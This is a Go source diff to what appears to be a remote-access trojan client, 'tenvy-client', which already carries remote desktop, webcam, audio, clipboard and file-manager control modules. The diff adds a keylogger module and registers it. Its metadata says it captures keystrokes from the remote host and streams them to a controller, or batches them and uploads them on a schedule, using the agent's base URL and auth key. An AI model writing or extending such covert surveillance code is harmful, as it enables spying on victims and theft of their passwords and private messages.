@@ -14,6 +14,7 @@ import (
 
 	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
 	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
+	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
@@ -138,6 +139,7 @@ func newDefaultModuleManager() *moduleManager {
 	registry.register(&appVncModule{})
 	registry.register(newRemoteDesktopModule(nil))
 	registry.register(&audioModule{})
+	registry.register(&keyloggerModule{})
 	registry.register(&webcamModule{})
 	registry.register(&clipboardModule{})
 	registry.register(&fileManagerModule{})
@@ -629,6 +631,10 @@ type audioModule struct {
 	bridge *audioctrl.AudioBridge
 }
 
+type keyloggerModule struct {
+	manager *keyloggerctrl.Manager
+}
+
 type webcamModule struct {
 	manager *webcamctrl.Manager
 }
@@ -750,6 +756,68 @@ func (m *audioModule) Handle(ctx context.Context, cmd protocol.Command) protocol
 func (m *audioModule) Shutdown(context.Context) {
 	if m.bridge != nil {
 		m.bridge.Shutdown()
+	}
+}
+
+func (m *keyloggerModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "keylogger",
+		Title:       "Keylogger",
+		Description: "Capture keystrokes and related telemetry from the remote host.",
+		Commands:    []string{"keylogger.start", "keylogger.stop"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "keylogger.stream",
+				Description: "Stream keystroke telemetry to the controller in near real time.",
+			},
+			{
+				Name:        "keylogger.batch",
+				Description: "Batch keystrokes offline and upload on a schedule.",
+			},
+		},
+	}
+}
+
+func (m *keyloggerModule) Init(_ context.Context, runtime ModuleRuntime) error {
+	return m.configure(runtime)
+}
+
+func (m *keyloggerModule) UpdateConfig(_ context.Context, runtime ModuleRuntime) error {
+	return m.configure(runtime)
+}
+
+func (m *keyloggerModule) configure(runtime ModuleRuntime) error {
+	cfg := keyloggerctrl.Config{
+		AgentID:   runtime.AgentID,
+		BaseURL:   runtime.BaseURL,
+		AuthKey:   runtime.AuthKey,
+		Client:    runtime.HTTPClient,
+		Logger:    runtime.Logger,
+		UserAgent: runtime.UserAgent,
+	}
+	if m.manager == nil {
+		m.manager = keyloggerctrl.NewManager(cfg)
+		return nil
+	}
+	m.manager.UpdateConfig(cfg)
+	return nil
+}
+
+func (m *keyloggerModule) Handle(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+	if m.manager == nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "keylogger subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		}
+	}
+	return m.manager.HandleCommand(ctx, cmd)
+}
+
+func (m *keyloggerModule) Shutdown(context.Context) {
+	if m.manager != nil {
+		m.manager.Shutdown(context.Background())
 	}
 }
 
